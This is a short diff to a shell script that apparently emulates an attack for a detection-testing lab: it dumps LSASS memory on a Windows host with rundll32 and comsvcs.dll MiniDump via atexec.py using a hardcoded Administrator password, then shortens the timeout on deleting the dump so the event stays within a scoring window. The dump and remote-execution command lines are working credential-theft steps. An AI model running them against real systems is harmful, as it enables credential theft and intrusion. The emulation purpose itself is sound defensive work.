@@ -26,7 +26,11 @@ echo "step: minidump (T1003.001)" >&2
 timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
   "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $lsass_pid C:\\Windows\\Temp\\l.dmp full" >/dev/null 2>&1 || true
 sleep 3
-timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
+# the cleanup budget must stay SMALL: this step sits between the technique and
+# the scoring fetch, and the goal's trailing window starts at the fetch — a
+# hung del burning a long timeout ages the dump event out of its own window
+# (measured at the phase exit: 0.00/valid with the signal shipped on time).
+timeout 30 atexec.py 'Administrator:changeme123!@'"$WIN" \
   'cmd /c del /f /q C:\Windows\Temp\l.dmp' >/dev/null 2>&1 || true
 
 # the pipeline settle: forwarder ship + index + >=2 collector polls + a meta
